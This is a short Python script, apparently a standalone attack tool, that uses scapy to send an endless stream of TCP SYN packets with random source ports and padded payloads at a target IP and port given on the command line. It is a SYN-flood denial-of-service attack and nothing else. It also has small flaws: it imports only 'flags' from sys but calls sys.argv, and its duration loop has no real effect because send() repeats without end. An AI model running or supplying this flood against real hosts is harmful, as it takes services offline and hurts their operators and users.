from sys import flags
from scapy.all import *

def syn_flood(target_ip, target_port, duration):

    for _ in range(duration):
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags='S')
        raw = Raw(b"X"*1024)
        pkt = ip/tcp/raw
        send(pkt, loop=1, verbose=0)


if __name__ == "__main__":
    syn_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))